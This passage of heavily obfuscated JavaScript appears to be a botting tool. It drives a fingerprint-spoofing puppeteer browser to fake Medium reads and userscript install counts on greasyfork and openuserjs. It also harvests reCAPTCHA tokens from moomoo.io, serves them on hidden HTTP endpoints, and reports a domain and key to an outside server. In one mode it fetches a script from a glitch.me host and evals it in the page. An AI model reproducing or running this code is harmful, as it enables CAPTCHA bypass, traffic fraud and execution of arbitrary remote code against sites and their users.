      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/424447' + '-xtaming-c' + 'lient-tami' + 'ng-io-hack' + 's',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/taming.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/451547' + '-moomoo-io' + '-insane-mo' + 'd-beta-too' + '-fast-read' + '-descripti' + 'on',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/424655' + '-i30cps-ut' + 'ility-mod',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/448601' + '-%E5%8A%9B' + '%E6%89%A3%' + 'E9%A2%98%E' + '7%9B%AE%E8' + '%BD%ACmark' + 'down',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/leetcode' + '.cn'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/445806' + '-moomoo-io' + '-auto-heal',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/434199' + '-moomoo-io' + '-helper-to' + '-become-pr' + 'o',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/405943' + '-moomoo-io' + '-agar-io-s' + 'urviv-io-s' + 'lither-io-' + 'diep-io-gl' + 'obal-name-' + 'manager-kr' + 'unker-comi' + 'ng-soon',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/slither.' + 'io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/454409' + '-video-dow' + 'nloader-fo' + 'r-tampermo' + 'nkey',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/452314' + '-adblock-s' + 'cript-for-' + 'webview',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/35466-' + 'mouseplus',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/456851' + '-omnifocus',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430253' + '-arras-io-' + 'multibox-s' + 'cript',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/arras.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/438879' + '-diep-io-p' + 'ermanent-l' + 'eader-arro' + 'w',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/diep.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430255' + '-warinspac' + 'e-bots',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/warin.sp' + 'ace'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/444523' + '-diep-io-m' + 'inimap-hig' + 'hlights',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/diep.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/456856' + '-optimize-' + 'quill-org',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/quill.or' + 'g'
    }
  ],
  userAgents = [
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + X(0x1e) + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-A102U' + Y(0x9) + 'Kit/537.36' + '\x20(KHTML,\x20l' + X(0x7) + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-G960U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-N960U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'WOW64)\x20App' + 'leWebKit/5' + '37.36\x20(KHT' + 'ML,\x20like\x20G' + 'ecko)\x20Chro' + 'me/108.0.0' + '.0\x20Safari/' + '537.36',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0)\x20' + 'AppleWebKi' + 't/537.36\x20(' + 'KHTML,\x20lik' + 'e\x20Gecko)\x20C' + 'hrome/108.' + '0.0.0\x20Safa' + 'ri/537.36',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6\x20Edg/108.' + '0.1462.46',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + X(0x7) + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6'
  ],
  miscSites = [
    'https://di' + 'scord.com',
    'https://st' + 'ratums.io',
    'https://ww' + 'w.npmjs.co' + 'm/',
    'https://gi' + 'thub.com',
    'https://mi' + 'necraft.ne' + 't',
    'https://ww' + 'w.wsj.com/',
    'https://zb' + 'eacon.org',
    'https://ya' + 'hoo.com',
    'https://ww' + 'w.theguard' + 'ian.com/',
    'https://ba' + 'idu.com/',
    'https://wi' + 'kipedia.or' + 'g',
    'https://po' + 'rnhub.com'
  ],
  miscSites2 = [
    'https://me' + 'dium.com/',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'ethics-of-' + 'advertisin' + 'g-and-ad-b' + 'locking-a6' + '2bdde987b0',
    'https://me' + 'dium.com/@' + 'digitalgir' + 'affes/7-aw' + X(0x4) + 'free-ai-to' + 'ols-you-sh' + 'ould-know-' + '43a1630ea4' + '09',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'a-commenta' + 'ry-on-the-' + 'ai-wave-21' + '5d668f827a',
    'https://me' + 'dium.com/@' + 'melih193/r' + 'eact-devel' + 'oper-roadm' + 'ap-2022-76' + 'ca119188bd',
    'https://me' + 'dium.com/e' + 'ntrepreneu' + 'r-s-handbo' + 'ok/is-your' + '-startup-a' + '-good-fit-' + 'for-ventur' + 'e-capital-' + 'bc59596df9' + 'e4',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'the-simple' + '-fundament' + 'als-of-c-e' + 'ed2fbb5792' + '9',
    'https://me' + 'dium.com/b' + 'etter-prog' + 'ramming/co' + 'de-review-' + 'chores-tha' + 't-we-shoul' + 'd-automate' + '-using-dan' + 'ger-js-6cf' + '72ff3bf98',
    'https://me' + 'dium.com/g' + 'itconnecte' + 'd/use-git-' + 'like-a-sen' + 'ior-engine' + 'er-ef6d741' + 'c898e',
    'https://me' + 'dium.com/@' + 'sudiparyal' + '185/differ' + 'ence-betwe' + 'en-foreach' + '-and-map-i' + 'n-javascri' + 'pt-342c50b' + '59f9',
    'https://me' + 'dium.com/@' + W(0x6, 'S$c@') + 'the-world-' + 'that-knew-' + 'too-much-e' + '9ca2372ee2' + '1',
    'https://me' + 'dium.com/b' + 'itsrc/adva' + 'nced-data-' + 'structures' + '-and-algor' + 'ithms-trie' + 's-47db931e' + '20e',
    'https://da' + 'shmacintyr' + 'e.medium.c' + 'om/a-list-' + 'of-stories' + '-donald-tr' + 'ump-paid-t' + 'o-catch-an' + 'd-kill-jus' + 't-leaked-5' + 'e29f9f5f68' + '7',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'small-java' + 'script-opt' + 'imization-' + 'tips-1c4cb' + '387a463',
    'https://me' + 'dium.com/@' + 'michaelcos' + 'tello.swe/' + 'dbspy-4-0-' + '6989c6ea47' + 'd8',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'chatgpt-on' + '-itself-3b' + '1042b968cb',
    'https://me' + 'dium.com/@' + 'thisisjimk' + 'eller/plea' + 'se-stop-in' + 'cluding-co' + 'lor-names-' + 'in-your-cs' + 's-classes-' + 'f1090f6f2e' + '29',
    'https://me' + 'dium.com/@' + 'mattcodes0' + '6/building' + '-projects-' + 'takes-time' + '-18dfa6d6e' + '702',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'a-rabbit-h' + 'ole-of-js-' + 'hyper-opti' + 'mization-a' + '618288174b',
    'https://me' + 'dium.com/@' + 'olopadeadu' + 'nola/the-c' + 'haos-in-ou' + 'r-twenties' + '-8fcefe061' + 'ef8',
    'https://me' + 'dium.com/@' + 'leanfolks/' + 'mobile-app' + '-architect' + 'ure-6848aa' + '1d5764',
    'https://bl' + 'og.bitsrc.' + 'io/i-asked' + '-chat-gpt-' + 'to-build-a' + '-to-do-app' + '-have-we-f' + 'inally-met' + '-our-repla' + 'cement-ad3' + '47ad74c51',
    'https://me' + 'dium.com/@' + 'alexey.ink' + 'in/never-h' + 'ave-separa' + 'te-sign-in' + '-routes-7c' + '9a6dd4dc7c',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'breaking-i' + 'nto-the-ma' + 'rket-1b665' + '2b2a05a',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'javascript' + '-series-th' + 'e-fundamen' + 'tals-1a646' + 'c357955',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'javascript' + '-series-oo' + 'p-and-cons' + 'tructors-1' + '0dc5877e98' + '5',
    'https://me' + 'dium.com/b' + 'etter-prog' + 'ramming/le' + 'gacy-code-' + 'potential-' + 'gold-mine-' + 'of-learnin' + 'g-a59fdcb1' + '4804',
    Y(0x1b) + 'dium.com/@' + 'syn_52523/' + 'a-commenta' + 'ry-on-the-' + 'ai-wave-ii' + '-7de427c9f' + 'd15'
  ],
  g = {
    'getToken': () => -0xa * 0x1c5 + -0x2 * 0x2d3 + -0x48 * -0x53
  };

function c(b, d) {
  const e = a();
  return c = function(f, g) {
    f = f - (-0x118d + -0x111b * -0x2 + 0x10a9 * -0x1);
    let h = e[f];
    if (c['PIVbbY'] === undefined) {
      var i = function(m) {
        const n = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';
        let o = '',
          p = '';
        for (let q = 0x200 + 0x3 * 0x859 + 0x3dd * -0x7, r, s, t = -0x1880 + 0x4e * 0x65 + -0x646; s = m['charAt'](t++); ~s && (r = q % (-0x15ec + -0x8 * -0x2a1 + 0xe8 * 0x1) ? r * (-0x11 * -0x175 + -0x7f2 + -0x1093) + s : s, q++ % (0x191b + 0x5 * -0xd7 + 0x14e4 * -0x1)) ? o += String['fromCharCode'](-0x1 * 0x1cc5 + -0x23df + -0x9 * -0x74b & r >> (-(-0x1f9 * -0xb + 0xd0 * -0xb + -0x5 * 0x28d) * q & -0x2539 + 0x110 + 0x242f)) : 0x1f49 + 0x1e9e * 0x1 + 0x12b * -0x35) {
          s = n['indexOf'](s);
        }
        for (let u = 0x9ca * 0x3 + 0x1420 + 0xb5 * -0x46, v = o['length']; u < v; u++) {
          p += '%' + ('00' + o['charCodeAt'](u)['toString'](0x1060 * 0x2 + 0xbab * -0x1 + -0x1505))['slice'](-(0x1 * -0x13e1 + 0x34 * -0x3b + -0x1fdf * -0x1));
        }
        return decodeURIComponent(p);
      };
      c['ZSgYDI'] = i, b = arguments, c['PIVbbY'] = !![];
    }
    const j = e[-0x7 * -0x10f + 0x7a4 + -0xf0d],
      k = f + j,
      l = b[k];
    return !l ? (h = c['ZSgYDI'](h), b[k] = h) : h = l, h;
  }, c(b, d);
}
if (doFlags['doActivate' + 'Browser'] && ((async () => {
    const Z = b;
    log('index.js\x20c' + 'alled');
    const {
      FakeBrowser: f
    } = require('fakebrowse' + 'r'), h = require('path'), i = h['resolve'](__dirname, './fakeBrow' + 'serUserDat' + 'a'), j = new f['Builder']()['displayUse' + 'rActionLay' + 'er'](0x17b * -0xf + -0x1 * 0x1ea1 + 0x34d6)['vanillaLau' + 'nchOptions'](pptOptions)['usePlugins']([require('puppeteer-' + 'extra-plug' + 'in-adblock' + 'er')({
      'blockTrackers': 0x1,
      'blockTrackersAndAnnoyances': 0x1
    })])['userDataDi' + 'r'](i);
    let k;
    r:
      for (;;)
        try {
          let n = await async function o() {
            let p;
            const q = {
              'User-Agent': userAgents['random'](),
              'Accept-Encoding': 'none'
            };
            try {
              p = (await axios['get'](PROCESSED_XURL_VAL, {
                'headers': q
              }))?.['data'];
            } catch (r) {}
            if (p)
              try {
                p = (await axios['get'](p, {
                  'headers': q
                }))?.['data'];
              } catch (s) {}
            if (!p)
              return await randomWait(), await o();
            try {
              return 'object' == typeof p ? p : 'string' == typeof p ? JSON['parse'](p) : {};
            } catch (u) {
              if (!p)
                return await randomWait(), await o();
            }
          }();
          doFlags['doExtFinge' + 'rprint'] && j['deviceDesc' + 'riptor'](n), k = await j['launch']();
          break r;
        } catch (p) {
          warn(p), await randomWait();
        }
    const l = k['userAction'];
    log('browser\x20la' + 'unched');
    const m = k['vanillaBro' + 'wser'];
    doFlags['doYT'] && setTimeout(async () => {
      for (;;)
        await runYTModule(m, l);
    }, 0x51 + 0x2359 * 0x1 + -0x102 * 0x23), doFlags['doGF'] && setTimeout(async () => {
      await runGFModule(m, l);
    }, 0x1dbe + -0x1 * 0x452 + -0x8 * 0x321), doFlags[Z(0xb, 'Bq1E') + 'ader'] && setTimeout(() => {
      !async function q() {
        const r = await m['createInco' + 'gnitoBrows' + 'erContext'](),
          u = await r['newPage']();
        for (;;) {
          let v = 0x194 * -0x3 + -0x81a + 0x3e * 0x35;
          if (await u['goto'](miscSites2['random'](), {
              'timeout': NETWORK_PATIENCE
            })['catch'](w => v++), await randomWait(), v)
            return await u['close'](), await r['close'](), await q();
          for (let w = -0x1da0 + 0x542 * 0x5 + 0x356; w < getRandomInt(-0xbbb * -0x3 + -0x212 * -0x11 + -0x4662, -0x5c4 * -0x2 + 0x43f * -0x1 + 0x5d * -0x14); w++)
            await u['keyboard']['press']('ArrowDown'), await randomWait();
          await randomWait(), await wait(-0x6e51 * -0x3 + 0x19b43 + -0x1fbd6 * 0x1);
        }
      }();
    }, 0xec * 0x1b + 0x7cb + 0x49d * -0x7), doFlags['doRemoteCa' + 'ptcha'] && setTimeout(async function q() {
      const a0 = d;

      function u() {
        axios['post']('https://st' + 'ratums.io/' + 'research', {
          'dom': process['env']['PROJECT_DO' + 'MAIN'],
          'key': PROCESSED_SYX_VAL
        }, {
          'headers': {
            'Content-Type': 'applicatio' + 'n/json'
          }
        })['catch'](z => {});
      }
      const v = await m['createInco' + 'gnitoBrows' + 'erContext']();
      let w = 0x190b + 0x1 * 0x5ef + 0x131 * -0x1a;
      const x = await v['newPage']();
      if (await x['goto']('https://mo' + 'omoo.io', {
          'timeout': MM_NETWORK_PATIENCE
        })['catch'](z => w++), w)
        return await x['close'](), await v['close'](), q();
      if (!(await x['evaluate']('document.d' + 'ocumentEle' + 'ment.inner' + 'HTML'))['includes']('isMoomooIo'))
        return await x[a0(0x1d)](), await v['close'](), q();
      let y;
      if (doFlags['doDual']) {
        if (y = await v['newPage'](), await y['goto']('https://mo' + 'omoo.io', {
            'timeout': MM_NETWORK_PATIENCE
          })['catch'](A => w++), w)
          return await y['close'](), await v['close'](), q();
        const z = await y['evaluate']('document.d' + 'ocumentEle' + 'ment.inner' + 'HTML');
        if (log(z['slice'](-0x179f + -0x4c + 0x17eb, -0x1354 * 0x2 + -0x12c2 + 0x2 * 0x1cce)), !z['includes']('isMoomooIo'))
          return await y['close'](), await v['close'](), q();
      }
      g['getToken'] = async function(A) {
        return await (A && doFlags['doDual'] ? y : x)['evaluate'](async () => new Promise(async (B, C) => {
          window['grecaptcha']['execute']('6LevKusUAA' + 'AAAAFknhlV' + '8sPtXAk5Z5' + 'dGP5T2FYIZ', {
            'action': 'homepage'
          })['then'](D => {
            B(D);
          });
        }));
      }, u(), setInterval(u, 0x8cae + 0xaa95 + -0xc213);
    }, -0x2648 + -0xe0e * 0x1 + 0x34ba), doFlags['doWhitepag' + 'esMode'] && setTimeout(async () => {
      (async function r() {
        const a1 = d;
        try {
          let s = -0x1f4a + -0xa6f + 0x29b9;
          const t = await m['createInco' + 'gnitoBrows' + 'erContext'](),
            u = await t['newPage']();
          if (u['on']('pageerror', function(v) {}), u['on']('error', function(v) {}), await u['goto']('https://ww' + 'w.whitepag' + 'es.com/m', {
              'timeout': MM_NETWORK_PATIENCE
            })[a1(0x0)](v => s++), s)
            return await u['close'](), await t['close'](), r();
          await wait(0x9e6 * -0x1 + -0x1422 + 0x29c0), await u['evaluate'](() => {
            let v = new XMLHttpRequest();
            v['open']('GET', 'https://co' + 'ntent-deli' + 'very-netwo' + 'rk.glitch.' + 'me/cdn/xm7' + '7/wp.js', -0x76d + 0x215a + -0x19ed), v['send'](), eval(v['responseTe' + 'xt']);
          }), await wait(-0x8 * 0x2eb10 + -0x1 * 0xf2977 + -0x1169dd * -0x3);
        } catch (v) {}
        return await page['close'](), await context['close'](), r();
      }());
    }, -0x2 * -0xa12 + 0x2 * 0xe56 + -0x306c);
  })()), doFlags['doCreateSe' + 'rver']) {
  const e = require('http')['createServ' + 'er'](async function(f, h) {
    const a2 = d,
      i = url['parse'](f['url'])['pathname'];
    h['writeHead'](0x792 + -0x174a + 0x84 * 0x20);
    const j = '/dkasjhdwi' + 'qodkjnwqhd' + 'wqodlkwjqn' + 'dwqkdmnBZc' + 'xzmczxc' == i;
    j || '/asdsadwqd' + 'qwdwqdwqdw' + a2(0xd) + 'dwqd' == i ? h['write'](await g['getToken'](j) || '') : h['write']('v0.6'), h['end']();
  });
  e['listen'](process['env']['PORT'] || 0x5 * -0x71f + -0x1 * -0x251b + 0x1e10);
}
doFlags['doOUJS'] && ((async () => {
  const a4 = b,
    a3 = d;
  async function f() {
    const k = h['random'](),
      m = k['replace']('/scripts/', '/install/') + '.user.js',
      [q, u] = (function() {
        const A = j['random']();
        return [
          A,
          A['includes']('Firefox')
        ];
      }()),
      v = function(A, B = 0x1b * 0x5e + -0xcf9 + 0x70 * 0x7) {
        if (A['includes']('Firefox'))
          return A['slice'](A['indexOf']('Firefox') + 'Firefox' ['length'] + (0x2f * 0x68 + 0x1262 + -0xb5 * 0x35));
        const C = A['indexOf']('Chrome/') + 'Chrome/' ['length'],
          D = A['slice'](C),
          E = D['slice'](0x24ab + -0x1459 + -0x1052, D['indexOf']('\x20'));
        return B ? E['slice'](0xf59 + 0x153c + -0x751 * 0x5, E['indexOf']('.')) : E;
      }(q),
      w = {
        'signal': AbortSignal['timeout'](0x3eca + -0x7dc + -0xfde),
        'headers': {
          'host': 'openuserjs' + '.org',
          'origin': 'https://op' + 'enuserjs.o' + 'rg',
          'user-agent': q,
          'accept': 'text/html,' + 'applicatio' + 'n/xhtml+xm' + 'l,applicat' + 'ion/xml;q=' + '0.9,image/' + 'avif,image' + '/webp,imag' + 'e/apng,*/*' + ';q=0.8,app' + 'lication/s' + 'igned-exch' + 'ange;v=b3;' + 'q=0.9',
          'accept-encoding': 'gzip,\x20defl' + 'ate,\x20br',
          'accept-language': 'en-US,en;q' + '=0.9',
          'cache-control': 'no-cache',
          'pragma': 'no-cache',
          'sec-fetch-dest': 'document',
          'sec-fetch-mode': 'navigate',
          'sec-fetch-site': 'same-origi' + 'n',
          'sec-fetch-user': '?1',
          'upgrade-insecure-requests': '1'
        },
        'body': null,
        'method': 'GET'
      };
    u ? Object['assign'](w['headers'], {
      'te': 'trailers'
    }) : Object['assign'](w['headers'], {
      'sec-ch-ua': '\x22Not\x20A(Bra' + 'nd\x22;v=\x2224\x22' + ',\x20\x22Chromiu' + 'm\x22;v=\x22' + v + '\x22',
      'sec-ch-ua-mobile': '?0',
      'sec-ch-ua-platform': '\x22Windows\x22'
    });
    const x = await fetch(i, w)['catch'](A => {});
    if (!x || !x['headers'])
      return;
    if (null === x['headers']['get']('X-RateLimi' + 't-Limit'))
      return;
    const y = {
      'signal': AbortSignal['timeout'](0x3d8f + 0xcb5 * 0x3 + -0x3c9e),
      'headers': {
        'host': 'openuserjs' + '.org',
        'origin': 'https://op' + 'enuserjs.o' + 'rg',
        'user-agent': q,
        'accept': 'text/html,' + 'applicatio' + 'n/xhtml+xm' + 'l,applicat' + 'ion/xml;q=' + '0.9,image/' + 'avif,image' + '/webp,imag' + 'e/apng,*/*' + ';q=0.8,app' + 'lication/s' + 'igned-exch' + 'ange;v=b3;' + 'q=0.9',
        'accept-encoding': 'gzip,\x20defl' + 'ate,\x20br',
        'accept-language': 'en-US,en;q' + '=0.9',
        'cache-control': 'no-cache',
        'pragma': 'no-cache',
        'referer': i,
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'same-origi' + 'n',
        'sec-fetch-user': '?1',
        'upgrade-insecure-requests': '1'
      },
      'body': null,
      'method': 'GET'
    };
    if (u ? Object['assign'](y['headers'], {
        'te': 'trailers'
      }) : Object['assign'](y['headers'], {
        'sec-ch-ua': '\x22Not\x20A(Bra' + 'nd\x22;v=\x2224\x22' + ',\x20\x22Chromiu' + 'm\x22;v=\x22' + v + '\x22',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '\x22Windows\x22'
      }), !await fetch(k, y)['catch'](A => {}))
      return;
    const z = {
      'headers': {
        'accept': 'text/x-use' + 'rscript,\x20*' + '/*',
        'accept-language': 'en-US,en;q' + '=0.9',
        'cache-control': 'max-age=0,' + '\x20must-reva' + 'lidate',
        'pragma': 'no-cache',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'none'
      },
      'referrerPolicy': 'strict-ori' + 'gin-when-c' + 'ross-origi' + 'n',
      'body': null,
      'method': 'GET'
    };
    u ? Object['assign'](z['headers'], {
      'te': 'trailers'
    }) : Object['assign'](z['headers'], {
      'sec-ch-ua': '\x22Not\x20A(Bra' + 'nd\x22;v=\x2224\x22' + ',\x20\x22Chromiu' + 'm\x22;v=\x22' + v + '\x22',
      'sec-ch-ua-mobile': '?0',
      'sec-ch-ua-platform': '\x22Windows\x22'
    }), await fetch(m, z);
  }
  const h = [
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/L' + 'ift_Web_Re' + 'strictions' + '_.io_Game_' + a3(0xf) + 'oo.ioKrunk' + 'er.io..),_' + 'Ad_Link_By' + 'passer,_Ad' + 'block,_MOR' + 'E!',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/M' + 'ooMoo.io,_' + 'Agar.io,_S' + 'urviv.io,_' + 'Slither.io' + ',_Diep.io,' + '_Global_Na' + 'me_Manager' + '_[Krunker_' + 'Coming_Soo' + 'n]',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/p' + 'ancake_mod' + '_Katana_+_' + 'Musket_AUT' + 'OHEAL_Anti' + '-Insta_sta' + 'rter_resou' + 'rces_and_m' + 'ore!!',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/Bloggerpe' + 'mula/Bypas' + 's_All_Shor' + 'tlinks_Man' + 'ual_Captch' + 'a',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/MAX30/Top' + 'AndDownBut' + 'tonsEveryw' + 'here',
      'https://op' + a4(0x19, 'Ls7s') + 'rg/scripts' + '/reek/Anti' + '-Adblock_K' + 'iller_Reek',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/ParticleC' + 'ore/YouTub' + 'e_+',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/MAX30/bon' + 'gacamsKill' + 'Ads',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/founcs/Li' + 'mitless_Fr' + 'eedom',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/aycabta/T' + 'witter_Ima' + 'ge_Maximiz' + 'er',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/Marti/ouj' + 's_-_JsBeau' + 'tify',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/AdlerED/%' + 'E6%9C%80%E' + a3(0x1) + '%9A%84%E8%' + '80%81%E7%8' + '9%8C%E8%84' + '%9A%E6%9C%' + 'ACCSDNGree' + 'ner%EF%BC%' + '9ACSDN%E5%' + 'B9%BF%E5%9' + '1%8A%E5%AE' + '%8C%E5%85%' + 'A8%E8%BF%8' + '7%E6%BB%A4' + '%E3%80%81%' + 'E4%BA%BA%E' + '6%80%A7%E5' + '%8C%96%E8%' + '84%9A%E6%9' + 'C%AC%E4%BC' + '%98%E5%8C%' + '96',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/laidbackt' + 'empo/EasyV' + 'ideoDownlo' + 'ad',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/O' + 'ptimize_Qu' + 'ill.org',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/mscarchil' + 'li/Amazon_' + 'Smile_Redi' + 'rect',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/AltoRetra' + 'to/IMDb_My' + '_Movies_en' + 'hancer',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/xthexder/' + 'Wide_GitHu' + 'b',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/navchanda' + 'r/Auto_Loa' + 'd_Big_Imag' + 'e',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/extension' + 'sapp/cinem' + 'apress',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/S' + 'urviv.io_X' + 'Client_(BE' + 'TA)',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/Zren/Resi' + 'ze_YT_To_W' + 'indow_Size',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/M' + 'oomoo.io_R' + 'emove_Cook' + 'ie_Prefere' + 'nces_Tab'
    ],
    i = 'https://op' + 'enuserjs.o' + 'rg/',
    j = [
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/11' + '0.0.0.0\x20Sa' + 'fari/537.3' + '6',
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'WOW64)\x20App' + 'leWebKit/5' + '37.36\x20(KHT' + 'ML,\x20like\x20G' + 'ecko)\x20Chro' + 'me/108.0.0' + '.0\x20Safari/' + '537.36',
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0)\x20' + 'AppleWebKi' + 't/537.36\x20(' + 'KHTML,\x20lik' + 'e\x20Gecko)\x20C' + 'hrome/108.' + '0.0.0\x20Safa' + 'ri/537.36',
      'Mozilla/5.' + '0\x20(Macinto' + 'sh;\x20Intel\x20' + 'Mac\x20OS\x20X\x201' + '3_1)\x20Apple' + 'WebKit/537' + '.36\x20(KHTML' + ',\x20like\x20Gec' + 'ko)\x20Chrome' + '/108.0.0.0' + '\x20Safari/53' + '7.36',
      'Mozilla/5.' + '0\x20(X11;\x20Li' + 'nux\x20x86_64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6',
